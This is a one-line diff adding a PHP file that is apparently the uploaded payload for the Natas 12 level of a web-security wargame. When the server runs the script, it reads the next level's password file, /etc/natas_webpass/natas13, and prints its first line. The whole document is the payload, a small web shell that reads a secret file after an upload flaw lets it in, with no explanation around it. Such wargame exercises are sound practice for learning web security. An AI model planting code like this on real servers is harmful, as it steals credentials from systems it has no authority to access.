@@ -1,0 +1,1 @@
+<?php echo "<br/>natas13:" . explode("\n", file_get_contents("/etc/natas_webpass/natas13"))[0] . "<br/>";?>
